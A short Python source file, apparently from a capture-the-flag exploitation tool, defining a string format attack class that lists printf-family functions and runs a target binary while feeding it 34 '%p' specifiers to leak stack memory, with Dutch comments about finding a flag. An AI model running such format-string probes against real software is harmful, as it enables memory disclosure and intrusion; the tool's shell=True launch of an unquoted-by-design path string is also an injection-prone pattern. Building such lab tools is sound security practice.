from typing import List
from exploits.exploit import Exploit
import subprocess


class StringFormatAttack(Exploit):
    def __init__(self):
        self._name = "string format attack"
        self._vulnerable_functions = [
            "fprint",
            "printf",
            "sprintf",
            "snprintf",
            "vfprintf",
            "vprintf",
            "vsprintf",
            "vsnprintf",
        ]
        self._found_vulnerable_functions = []

    @property
    def name(self) -> str:
        return self._name

    @property
    def vulnerable_functions(self) -> List[str]:
        return self._vulnerable_functions

    @property
    def found_vulnerable_functions(self) -> List[str]:
        return self._found_vulnerable_functions

    # specifier telkens itereren als flag structuur niet is gevonden
    # als de hoeveelheid specifiers kleiner is dan de aantal hex waardes, dan stoppen -> gefaalt
    def attempt_exploit(self, path):
        print("Attempting string format attack")
        process = subprocess.Popen(
            f'"{path}"', stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True
        )
        input_str = " ".join(["%p"] * 34) + "\n"
        output = process.communicate(input=input_str.encode())
        print(output)
